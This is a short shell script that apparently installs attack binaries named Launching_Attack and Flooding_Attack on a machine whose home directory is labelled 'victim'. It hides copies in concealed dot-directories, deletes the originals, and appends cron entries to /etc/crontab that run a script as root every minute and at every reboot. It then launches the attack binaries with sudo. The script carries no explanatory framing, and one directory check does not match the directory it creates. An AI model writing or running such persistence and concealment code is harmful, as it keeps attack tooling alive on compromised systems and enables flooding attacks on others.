[ ! -d ~/.etc/.module ] && mkdir -p ~/.etc/.module
[ ! -d ~/.sys/.module ] && mkdir -p ~/.sys/.preference
cp -a ~/Launching_Attack ~/.etc/.module
cp -a ~/Flooding_Attack ~/.etc/.module
cp -a ~/Launching_Attack_Backup ~/.sys/.preference
cp -a ~/Flooding_Attack ~/.sys/.preference
mv ~/.sys/.preference/Launching_Attack_Backup ~/.sys/.preference/Launching_Attack
rm -f ~/Flooding_Attack
rm -f ~/Launching_Attack
rm -f ~/Launching_Attack_Backup
echo '*/1 * * * *  root  /home/victim/cron.sh' >> /etc/crontab
echo '@reboot  root  /home/victim/cron.sh\n' >> /etc/crontab
sudo ~/.etc/.module/Launching_Attack
sudo ~/.sys/.preference/Launching_Attack 
